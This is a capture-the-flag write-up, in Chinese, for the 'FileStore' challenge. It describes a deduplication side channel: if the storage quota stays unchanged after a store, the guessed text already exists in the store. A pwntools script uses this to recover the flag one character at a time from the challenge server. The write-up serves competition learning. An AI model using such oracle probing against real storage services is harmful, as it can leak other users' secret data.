# FileStore

Tags: Brute Force, Misc

連上伺服器後發現一共有4種操作：

- Load
- Store
- Status
- Exit

從source code觀察store, load後發現，資料是以Block的方式被儲存的，並且為了節省空間，資料取出是以指針位置及長度來取出的。

所以我們可以用暴力破解的方式，一一嘗試，只要每次store資料後，檢查status，如果已使用的quota沒增加，代表我們所輸入的資料已經出現在資料庫中了。以此概念，將所有可用字元一一試過。並保留之前的紀錄，慢慢地我們就能推導出正確的Flag。

不過值得注意的是，因為儲存的方式是Block，所以長度超過一定值的時候，會被分開處理，為了確保我們的答案是連續的，我們可以從後往前推導。

```python
from pwn import *
from string import printable

process = remote('filestore.2021.ctfcompetition.com', 1337)

flag = ["}"]
origin_quota = 0.026

def getQuota(process):
    process.sendline('status')
    process.recvuntil('Quota: ')
    return float(process.recvuntil('kB')[:-2])

while True:
    for c in printable:
        print("Trying", c, 'and current quota is', origin_quota)
        process.sendline('store')
        process.sendline(c + ''.join(flag[::-1]))
        new_quota = getQuota(process)
        if new_quota == origin_quota:
            print("HIT", c)
            flag.append(c)
            print("The found flag is ", ''.join(flag[::-1]))
            break
        else:
            origin_quota = new_quota
```